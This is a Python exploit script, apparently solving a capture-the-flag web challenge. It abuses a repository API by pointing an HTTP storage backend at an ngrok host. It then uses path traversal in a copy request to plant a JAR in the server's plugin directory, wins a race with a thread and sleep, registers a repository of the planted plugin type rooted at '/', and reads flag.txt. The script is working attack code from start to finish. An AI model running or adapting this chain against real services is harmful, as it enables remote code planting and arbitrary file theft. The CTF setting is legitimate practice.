import requests
from urllib.parse import quote_plus
import threading
import time

s = requests.Session()
url = 'https://rdqmxhji.web.ctf.uscybergames.com/api/repos/'

def list_repos():
    r = s.get(url + 'list')
    print(r.status_code, r.reason)
    print(r.text)

def add_repo(name, typ, config):
    body = {
        'name': name,
        'type': typ,
        'config': config
    }
    r = s.post(url + 'add', json=body)
    print(r.status_code, r.reason)
    print(r.text)

webhook_url = 'https://2cb4-73-128-250-252.ngrok-free.app/get_file?file='
add_repo('http', 'HTTPStorage', {
    'url': webhook_url
})
add_repo('test', 'LocalStorage', {})
list_repos()

def view_file(slug, file):
    file = quote_plus(file)
    r = s.get(f'{url}file/{slug}/{file}')
    print(r.status_code, r.reason)
    print(r.text)

def view(slug):
    r = s.get(f'{url}view/{slug}')
    print(r.status_code, r.reason)
    print(r.text)

def copy(source, target, files):
    body = {
        'source': source,
        'target': target,
        'files': files
    }
    r = s.post(url + 'copy', json=body)
    print(r.status_code, r.reason)
    print(r.text)


def async_setup():
    files = [
        '../../../../../app/plugins/storage/TestStorage.jar',
        'wait.txt',
        'wait.txt',
        'wait.txt',
        'wait.txt',
        'wait.txt',
    ]
    copy('http', 'test', files)

thread = threading.Thread(target=async_setup)
thread.start()

time.sleep(3)

add_repo('hacked', 'TestStorage', {
    'path': '/'
})
view_file('hacked', 'flag.txt')

thread.join()